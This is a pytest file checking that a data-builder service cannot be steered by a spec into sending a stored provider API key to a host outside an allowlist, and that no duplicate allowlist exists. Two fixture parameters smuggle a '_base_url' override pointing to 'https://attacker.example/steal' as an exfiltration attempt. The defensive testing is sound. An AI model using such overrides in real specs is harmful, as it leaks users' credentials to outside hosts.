"""A provider key goes only where kpubdata's allowlist says it may (#685).

Builder's SSRF guard (``ingestion/url_fetch.py``) asks whether an address is publicly
routable, and ``attacker.example`` is. That is fine for a bare ``url`` source, which
carries no credential. For a credentialed source the question is different — may *this*
key go to *that* host — and kpubdata answers it with one allowlist
(``kpubdata._hosts``, kpubdata#519). These tests hold builder to two things: a spec
cannot steer a credentialed call to another host, and builder keeps no second copy
of the list to drift from the first.
"""

from __future__ import annotations

from pathlib import Path

import httpx
import kpubdata.transport.http as kpubdata_http
import pytest
from kpubdata._hosts import PROVIDER_ALLOWED_HOSTS

from kpubdata_builder.cli import _create_client
from kpubdata_builder.credentials import AesGcmCredentialCipher, SQLiteCredentialRepository
from kpubdata_builder.service import BuilderService
from kpubdata_builder.service.auth import Principal

_ROOT = Path(__file__).resolve().parents[2]
_KEY = "HostCheckKey0123456789+/=="
_PRINCIPAL = Principal("oidc", "host-user", "oidc:host-owner")


def _spec(dataset: str, params: str) -> str:
    return f"""\
dataset_id: host.check
title: Host check
description: A spec that tries to send the key elsewhere
sources:
  - provider: datago
    dataset: {dataset}
    params: {params}
exports:
  - kind: jsonl
    output_path: out/data.jsonl
"""


@pytest.fixture
def requests_seen(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> tuple[BuilderService, list]:
    monkeypatch.delenv("KPUBDATA_DATAGO_API_KEY", raising=False)
    monkeypatch.delenv("KPUBDATA_DATAGO_EXTRA_HOSTS", raising=False)
    # The cross-repo job replays recorded fixtures instead of calling HTTP; this test
    # needs the HTTP path it observes.
    monkeypatch.delenv("KPUBDATA_REPLAY_DIR", raising=False)
    seen: list[httpx.Request] = []

    def handle(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, json={"response": {"header": {"resultCode": "00"}}})

    real_client = httpx.Client
    monkeypatch.setattr(
        kpubdata_http.httpx,
        "Client",
        lambda **kw: real_client(transport=httpx.MockTransport(handle), **kw),
    )
    runs = tmp_path / "runs"
    runs.mkdir()
    service = BuilderService(
        output_root=runs,
        client_factory=_create_client,
        credential_repository=SQLiteCredentialRepository(
            tmp_path / "credentials.sqlite3", AesGcmCredentialCipher(b"k" * 32)
        ),
    )
    stored = service.put_provider_credential("datago", {"credential": _KEY}, principal=_PRINCIPAL)
    assert stored.status_code == 200
    return service, seen


@pytest.mark.parametrize(
    ("dataset", "params"),
    [
        # datago.generic takes its host from `_base_url`; kpubdata refuses a host
        # outside the list — and builder never reaches it, because a build lists.
        ("generic", "{_base_url: 'https://attacker.example/steal', _envelope: false}"),
        # A host override smuggled as an ordinary parameter is just a parameter.
        ("air_quality", "{sidoName: 서울, _base_url: 'https://attacker.example/steal'}"),
    ],
    ids=["generic-base-url", "base-url-as-param"],
)
def test_a_spec_cannot_send_the_key_to_another_host(
    requests_seen: tuple[BuilderService, list[httpx.Request]], dataset: str, params: str
) -> None:
    """Negative: whatever the spec says, no request leaves for a non-allowlisted host."""
    service, seen = requests_seen

    service.build(_spec(dataset, params), run_id=f"host-{dataset}", principal=_PRINCIPAL)

    elsewhere = [r for r in seen if not r.url.host.endswith("data.go.kr")]
    assert elsewhere == []


def test_builder_keeps_no_copy_of_the_host_allowlist() -> None:
    """One source of truth: a second list is how `_sensitive.py` became three copies.

    A copy would repeat several of kpubdata's allowlisted hosts in one file. Any
    builder code that needs the list imports ``kpubdata._hosts`` instead.
    """
    hosts = {
        host.lstrip(".")
        for allowed in PROVIDER_ALLOWED_HOSTS.values()
        for host in allowed
        if "." in host.lstrip(".")
    }
    copies = {}
    for path in sorted((_ROOT / "src").rglob("*.py")):
        text = path.read_text(encoding="utf-8")
        found = {host for host in hosts if f'"{host}"' in text or f"'{host}'" in text}
        if len(found) >= 3:
            copies[str(path.relative_to(_ROOT))] = sorted(found)

    assert copies == {}
